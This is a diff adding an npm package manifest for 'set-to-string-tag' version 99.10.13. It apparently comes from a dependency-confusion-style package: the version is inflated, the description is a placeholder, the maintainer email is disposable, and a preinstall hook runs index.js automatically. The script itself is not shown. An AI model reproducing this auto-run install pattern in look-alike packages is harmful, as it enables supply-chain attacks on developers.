@@ -1,0 +1,39 @@
+{
+    "name": "set-to-string-tag",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "set-to-string-tag@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-tH/9wDkfEie4KAXyKvDaw55j273cUdpPCcr1Nrv02Qqg2Iie6vQgxVHXIhq2pWP+2RwycEOh7CwQkH1q3USdkA==",
+        "shasum": "b2a0f359b8f93c2073742643299a9dff10c9c28e",
+        "tarball": "https://registry.npmjs.org/set-to-string-tag/-/set-to-string-tag-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5075,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXaACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmp4zhAAmhoUNviXAiW/Cy/8ZmYI75TMx6A0SHsVF+SQRgr9NA3cYFuG\r\nzLI8JdqZ3AEDdTA4cnq2oH4ve4rBFGsNJsHubTT+xfoIhwwH/BilUN34pLB/\r\nq/A1yfBbw8zwdrRHidRnO8NozGd9CYNja2TsqLuoeUx/KkFoMxSGvZY/Yzpa\r\nIWeg0NMWjywgVuq1DRdkfZNkG+4Aurkmg7ljpdX51llqe+wd1Bwf7sG6/rqp\r\npUtO1E2UJa/hEkOL8VUBMMwgzZKIqtN9yNtsSmXr3mKqvDGFO5m75055ifcA\r\nFxevTqRvgQdtsmaxn5YxgCWu8ofH7D8hMm0EfYSABU1T6ovGkrfjUm8tkr9S\r\n4jlNtOTpX7nB6K96Cl0nbXpzz6TFOseXM1r6VEcP6Izo/k0e9lRV0ueleejX\r\nIfJ7pAGpogQ51BEkLcbK1BmNxU0mnTctX0xxg9lB8YPj/AySC+ZxYcAxBJtj\r\nyATuar7wErxdleqVmpttyznGOBxrYX4ODuRfluT3KscMClp7Bw3adfzmCHJh\r\ndx0lf4vex7RnZCiT60mSHJqOi+xsRQU5I7aKyotOnuu17TYmxMSheFFa1Sc5\r\nrktI94cvZPbnZpILPLTcwdaUBEI1pqIynX8gMoBXABL9/lN7mQMFsRabUF+c\r\ntNedf/BcY4WEGuszupP9kvh3iY8M79Ss0DE=\r\n=baSo\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "bfxc5a2m",
+        "email": "bfxc5a2m@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "bfxc5a2m",
+            "email": "bfxc5a2m@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/set-to-string-tag_99.10.13_1648420314365_0.9102831503430646"
+    },
+    "_hasShrinkwrap": false
+}
